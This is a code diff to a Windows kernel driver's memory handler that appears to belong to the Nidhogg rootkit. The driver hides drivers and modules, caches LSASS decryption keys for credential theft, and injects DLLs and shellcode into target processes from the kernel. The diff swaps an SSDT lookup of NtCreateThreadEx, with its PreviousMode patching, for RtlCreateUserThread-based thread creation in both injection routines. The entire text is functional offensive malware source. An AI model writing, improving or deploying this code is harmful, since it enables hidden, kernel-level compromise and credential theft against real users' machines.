@@ -2,9 +2,6 @@
 #include "MemoryHandler.h"
 
 MemoryHandler::MemoryHandler() {
-	NtCreateThreadEx = NULL;
-	ssdt = NULL;
-
 	lsassMetadata.Collected = false;
 	lsassMetadata.DesKey = NULL;
 	lsassMetadata.IvAddress = NULL;
@@ -17,14 +14,6 @@ MemoryHandler::MemoryHandler() {
 
 	if (!InitializeList(&hiddenDrivers) || !InitializeList(&hiddenModules))
 		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
-
-	__try {
-		ssdt = GetSSDTAddress();
-		NtCreateThreadEx = static_cast<tNtCreateThreadEx>(GetSSDTFunctionAddress(ssdt, "NtCreateThreadEx"));
-	}
-	__except (EXCEPTION_EXECUTE_HANDLER) {
-		ExRaiseStatus(GetExceptionCode());
-	}
 }
 
 MemoryHandler::~MemoryHandler() {
@@ -39,7 +28,9 @@ MemoryHandler::~MemoryHandler() {
 		NidhoggMemoryHandler->RestoreModule(item);
 	};
 	ClearList<HiddenItemsList, HiddenDriverEntry>(&hiddenDrivers, driverCleaner);
+	FreeVirtualMemory(this->hiddenDrivers.Items);
 	ClearList<HiddenItemsList, HiddenModuleEntry>(&hiddenModules, moduleCleaner);
+	FreeVirtualMemory(this->hiddenModules.Items);
 
 	AutoLock lsassLock(cachedLsassInfo.Lock);
 	FreeVirtualMemory(cachedLsassInfo.DesKey.Data);
@@ -221,13 +212,18 @@ NTSTATUS MemoryHandler::InjectDllThread(_In_ IoctlDllInfo& dllInfo) const {
 	}
 
 	// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
-	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
-	PCHAR previousMode = reinterpret_cast<PCHAR>(reinterpret_cast<PUCHAR>(PsGetCurrentThread()) + THREAD_PREVIOUSMODE_OFFSET);
-	CHAR tmpPreviousMode = *previousMode;
-	*previousMode = KernelMode;
-	status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, static_cast<PTHREAD_START_ROUTINE>(loadLibraryAddress),
-		remoteAddress, 0, NULL, NULL, NULL, NULL);
-	*previousMode = tmpPreviousMode;
+	status = RtlCreateUserThread(
+		hProcess,
+		NULL,
+		FALSE,
+		0,
+		0,
+		0,
+		reinterpret_cast<PUSER_THREAD_START_ROUTINE>(loadLibraryAddress),
+		remoteAddress,
+		&hTargetThread,
+		&cid
+	);
 
 	if (hTargetThread)
 		ZwClose(hTargetThread);
@@ -392,7 +388,7 @@ NTSTATUS MemoryHandler::InjectShellcodeThread(_In_ IoctlShellcodeInfo& shellcode
 	cid.UniqueProcess = pid;
 	cid.UniqueThread = NULL;
 	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
-
+	
 	do {
 		if (!NT_SUCCESS(status))
 			break;
@@ -407,13 +403,18 @@ NTSTATUS MemoryHandler::InjectShellcodeThread(_In_ IoctlShellcodeInfo& shellcode
 			break;
 
 		// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
-		InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
-		PCHAR previousMode = reinterpret_cast<PCHAR>(reinterpret_cast<PUCHAR>(PsGetCurrentThread()) + THREAD_PREVIOUSMODE_OFFSET);
-		CHAR tmpPreviousMode = *previousMode;
-		*previousMode = KernelMode;
-		status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, 
-			static_cast<PTHREAD_START_ROUTINE>(remoteAddress), NULL, 0, NULL, NULL, NULL, NULL);
-		*previousMode = tmpPreviousMode;
+		status = RtlCreateUserThread(
+			hProcess,
+			NULL,
+			FALSE,
+			0,
+			0,
+			0,
+			reinterpret_cast<PUSER_THREAD_START_ROUTINE>(remoteAddress),
+			remoteAddress,
+			&hTargetThread,
+			&cid
+		);
 
 	} while (false);
 
